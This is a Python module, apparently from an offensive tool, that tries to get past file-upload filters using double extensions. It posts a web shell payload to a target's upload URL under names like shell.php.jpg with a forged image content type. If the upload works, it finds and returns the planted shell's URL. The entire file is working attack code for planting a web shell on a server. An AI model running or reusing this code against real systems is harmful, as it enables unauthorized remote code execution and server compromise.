"""Double extension bypass technique"""

from ..config import DOUBLE_EXTENSIONS
from ..utils.name_generator import generate_shell_name

def attempt_double_extension(request_handler, file_finder, upload_url, shell_content):
    """
    Bypass using double extensions (shell.php.jpg)
    """
    print("[*] Attempting double extension bypass...")
    
    for ext in DOUBLE_EXTENSIONS:
        filename = f"{generate_shell_name()}.{ext}"
        
        files = {
            'file': (filename, shell_content, 'image/jpeg')
        }
        
        response = request_handler.post(upload_url, files=files)
        
        if response and response.status_code == 200:
            shell_url = file_finder.find_uploaded_file(filename, response)
            if shell_url:
                print(f"    [+] SUCCESS with {ext}! Shell at: {shell_url}")
                return shell_url
    
    print("    [-] Double extension bypass failed")
    return None